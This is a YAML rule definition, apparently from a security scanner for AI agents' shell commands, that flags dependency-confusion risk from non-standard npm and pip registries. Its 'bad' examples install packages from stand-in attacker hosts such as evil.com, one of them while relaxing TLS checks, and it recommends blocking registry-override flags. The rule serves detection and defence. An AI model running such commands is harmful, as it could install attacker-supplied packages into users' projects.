id: "supply-chain/dependency-confusion/non-standard-registry"
version: "1.0.0"
kingdom: "Supply Chain Compromise"
kingdom_id: 7
category: "Dependency Confusion"
category_id: "7.1"
name: "Non-Standard Package Registry"
risk_level: "high"

abstract: |
  A command installs packages from a non-standard registry, enabling
  dependency confusion attacks where malicious packages shadow legitimate ones.

explanation: |
  Package managers can be redirected to alternative registries:
  - `npm install --registry https://evil-registry.com` — npm registry override
  - `pip install --extra-index-url https://evil.com/simple/` — pip extra index
  - `pip install --trusted-host evil.com` — bypasses TLS verification

  Dependency confusion exploits the fact that package managers may prefer
  packages from alternative registries over official ones. An attacker
  publishes a malicious package with the same name as an internal package
  on a public registry, and the package manager installs the malicious version.

  AI agents may add --extra-index-url or --registry flags when troubleshooting
  installation issues or following outdated documentation.

recommendation: |
  - Block all registry override flags (--registry, --extra-index-url, --trusted-host).
  - Use .npmrc and pip.conf to lock registries at the project level.
  - Audit any package install that deviates from standard registries.

examples:
  bad:
    - "npm install --registry https://evil-registry.com lodash"
    - "pip install --extra-index-url https://evil.com/simple/ package"
    - "pip install --trusted-host evil.com package"
  good:
    - "npm install lodash"
    - "pip install requests"

compliance:
  owasp-llm-2025: ["LLM03", "LLM06"]

references:
  mitre_attack: ["T1195.001"]
  cwe: ["CWE-829"]
  external:
    - title: "MITRE ATT&CK: Supply Chain Compromise: Compromise Software Dependencies"
      url: "https://attack.mitre.org/techniques/T1195/001/"

analyzers: ["regex", "structural", "semantic"]
related_rules: ["sc-block-npm-registry-override", "sc-block-pip-extra-index", "sc-block-pip-trusted-host"]
